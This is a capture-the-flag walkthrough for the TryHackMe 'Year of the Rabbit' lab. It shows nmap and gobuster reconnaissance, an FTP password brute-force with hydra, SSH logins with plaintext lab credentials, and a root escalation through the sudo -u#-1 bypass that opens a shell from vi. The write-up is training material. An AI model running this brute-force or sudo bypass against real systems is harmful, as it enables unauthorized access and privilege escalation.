# Year of the Rabbit

**Room Link:** [https://tryhackme.com/room/yearoftherabbit](https://tryhackme.com/room/yearoftherabbit)

### Initial Scan

**Kali**

<pre><code><strong>nmap -A $VICTIM
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VICTIM
</strong></code></pre>



### TCP/80 - HTTP

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

### Turn off Javascript

```
Enter about:config into the search bar and select Accept the Risk and Continue.
Enter javascript.enabled into the search box at the top of the page.
Select the javascript.enabled toggle to change the value to false.
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>







<figure><img src="../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
strings Hot_Babe.png 
```

<figure><img src="../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
hydra -l ftpuser -P passwords.txt ftp://$VICTIM
```

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

## FTP

**Kali**

```
ftp $VICTIM
password: 5iez1wGXKfPKQ
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Elis creds is encoded with something called Brain fuck. There are tools online to decode it.

**Link:** [https://www.dcode.fr/brainfuck-language](https://www.dcode.fr/brainfuck-language)

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh eli@$VICTIM
Password: DSpDiM1wAEwid
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
locate s3cr3t
cat cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
su gwendoline
Password: MniVCQVhQHUNI
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

## **Privilege escalation**

Mostly followed the link below, we can't run sudo with root as we have (ALL , !root) here. if we had (ALL , ALL) it would be easy to escalate. Adding sudo -u#-1  to infront of the command allows us to bypass this.

**Link:** [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

**Victim**

```
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
#While vi is open run:
:!/bin/sh
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>























